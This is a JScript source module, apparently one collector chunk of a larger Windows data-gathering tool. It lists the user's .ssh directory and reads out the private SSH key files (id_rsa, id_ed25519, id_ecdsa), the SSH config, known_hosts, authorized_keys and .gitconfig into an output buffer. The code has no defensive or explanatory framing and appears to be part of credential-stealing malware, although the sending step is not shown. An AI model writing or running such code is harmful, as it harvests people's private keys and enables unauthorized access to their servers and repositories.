// chunk: collectors/ssh_keys
// depends: core/emit_buffer, core/run_cmd, core/file_ops
// provides: collect_ssh_keys
// format: jscript

function collect_ssh_keys() {
    emit("\r\n=== SSH KEYS ===\r\n");
    var home = _s.ExpandEnvironmentStrings("%USERPROFILE%");
    var sshDir = home + "\\.ssh";
    if (_fso.FolderExists(sshDir)) {
        emit(_run("dir /b \"" + sshDir + "\""));
        var files = ["id_rsa", "id_ed25519", "id_ecdsa", "config", "known_hosts", "authorized_keys"];
        for (var i = 0; i < files.length; i++) {
            var fp = sshDir + "\\" + files[i];
            if (file_exists(fp)) {
                emit("--- " + files[i] + " ---\r\n");
                emit(read_file(fp, 32768));
                emit("\r\n");
            }
        }
    } else {
        emit("  .ssh directory not found\r\n");
    }
    emit("\r\n=== GIT CONFIG ===\r\n");
    if (file_exists(home + "\\.gitconfig")) {
        emit(read_file(home + "\\.gitconfig", 8192));
    }
}
